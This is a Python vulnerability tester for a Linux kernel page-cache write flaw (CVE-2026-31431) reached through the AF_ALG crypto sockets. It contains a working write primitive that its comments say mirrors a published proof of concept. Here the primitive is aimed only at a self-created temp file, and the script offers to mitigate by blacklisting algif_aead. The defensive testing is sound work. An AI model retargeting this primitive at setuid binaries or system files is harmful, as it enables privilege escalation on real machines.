#!/usr/bin/env python3
# /// script
# dependencies = []
# ///
#
# CVE-2026-31431 (Copy Fail) vulnerability tester.
# Uses the same page-cache write primitive as Theori's PoC,
# but targets a self-created temp file instead of a setuid binary.
# Safe to run unprivileged. No system files are touched.

import os, sys, socket, struct, tempfile, subprocess

if sys.version_info < (3, 10):
    sys.exit("Python 3.10+ required (os.splice)")

AF_ALG     = 38
SOL_ALG    = 279
MSG_MORE   = 0x8000

# rtattr(rta_len=8, rta_type=1) + be32(enckeylen=16) + 16-byte hmac key + 16-byte aes key
KEY = bytes.fromhex("0800010000000010" + "00" * 32)


def patch_chunk(fd, offset, value):
    """Attempt a 4-byte page-cache write at `offset` in the file behind `fd`.
    Mirrors Theori's c() exactly, just parameterized on the target fd."""
    a = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    a.setsockopt(SOL_ALG, 1, KEY)        # ALG_SET_KEY
    a.setsockopt(SOL_ALG, 5, None, 4)    # ALG_SET_AEAD_AUTHSIZE = 4
    u, _ = a.accept()

    o = offset + 4
    i = b"\x00"
    u.sendmsg(
        [b"A" * 4 + value],
        [
            (SOL_ALG, 3, i * 4),               # ALG_SET_OP = DECRYPT
            (SOL_ALG, 2, b"\x10" + i * 19),    # ALG_SET_IV = 16-byte zero IV
            (SOL_ALG, 4, b"\x08" + i * 3),     # ALG_SET_AEAD_ASSOCLEN = 8
        ],
        MSG_MORE,
    )

    r, w = os.pipe()
    os.splice(fd, w, o, offset_src=0)
    os.splice(r, u.fileno(), o)

    try:
        u.recv(8 + offset)
    except OSError:
        pass

    os.close(r)
    os.close(w)
    u.close()
    a.close()


MODPROBE_CONF = "/etc/modprobe.d/disable-algif-aead.conf"
MODPROBE_RULE = "install algif_aead /bin/false"

TEST_SIZE   = 64
TARGET_OFF  = 16
MARKER      = b"\xde\xad\xbe\xef"


def test_vulnerable():
    """Returns True if vulnerable, False if safe, None if inconclusive."""

    # check if AF_ALG + authencesn is reachable
    print("  Probing AF_ALG + authencesn...", end=" ")
    try:
        s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
        s.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
        s.close()
    except OSError as e:
        print(f"not available ({e})")
        return False
    print("available")

    # create test file
    tmp = tempfile.NamedTemporaryFile(delete=False)
    tmp.write(b"\x00" * TEST_SIZE)
    tmp.flush()
    os.fsync(tmp.fileno())
    tmp.close()

    # attempt page-cache write
    print(f"  Attempting page-cache write...", end=" ")
    fd = os.open(tmp.name, os.O_RDONLY)
    try:
        patch_chunk(fd, TARGET_OFF, MARKER)
    except OSError as e:
        print(f"failed ({e})")
        os.close(fd)
        os.unlink(tmp.name)
        return None
    os.close(fd)
    print("done")

    # check result
    with open(tmp.name, "rb") as f:
        data = f.read()
    os.unlink(tmp.name)

    written = data[TARGET_OFF : TARGET_OFF + 4]
    print(f"  Offset {TARGET_OFF}: {written.hex()}", end="")
    if written == MARKER:
        print(" ← MODIFIED")
        return True
    else:
        print(" ← unchanged")
        return False


def apply_mitigation():
    if os.geteuid() != 0:
        print("  need root to patch — rerun with sudo")
        return False

    print(f"  Writing {MODPROBE_CONF}...")
    with open(MODPROBE_CONF, "w") as f:
        f.write(MODPROBE_RULE + "\n")

    print("  Unloading algif_aead...", end=" ")
    ret = subprocess.run(["rmmod", "algif_aead"], capture_output=True)
    if ret.returncode == 0:
        print("ok")
    else:
        # module might not be loaded, or built-in
        err = ret.stderr.decode().strip()
        if "not found" in err or "not currently loaded" in err:
            print("was not loaded")
        elif "builtin" in err.lower():
            print("built-in — reboot required")
            return False
        else:
            print(f"failed ({err})")
            return False
    return True


def main():
    print("CVE-2026-31431 (Copy Fail) — vulnerability tester")
    print("=" * 50)

    print("\n[1] Testing...")
    result = test_vulnerable()

    if result is None:
        print("\n⚠️  INCONCLUSIVE")
        sys.exit(2)
    elif not result:
        print("\n✅ NOT VULNERABLE")
        sys.exit(0)

    # vulnerable
    print("\n🚨 VULNERABLE — kernel is in-window for CVE-2026-31431")
    resp = input("\nApply mitigation? (blacklist + unload algif_aead) [Y/n] ").strip().lower()
    if resp in ("", "y", "yes"):
        print("\n[2] Applying mitigation...")
        if not apply_mitigation():
            sys.exit(1)

        print("\n[3] Retesting...")
        result = test_vulnerable()
        if result is None:
            print("\n⚠️  INCONCLUSIVE on retest")
            sys.exit(2)
        elif result:
            print("\n🚨 STILL VULNERABLE — module may be built-in, reboot required")
            sys.exit(1)
        else:
            print("\n✅ MITIGATED — algif_aead blacklisted and unloaded")
            print("   Still update kernel when patch is available")
            sys.exit(0)
    else:
        print("\nSkipped. Manual remediation:")
        print(f'  echo "{MODPROBE_RULE}" > {MODPROBE_CONF}')
        print("  rmmod algif_aead 2>/dev/null")
        sys.exit(1)


if __name__ == "__main__":
    main()
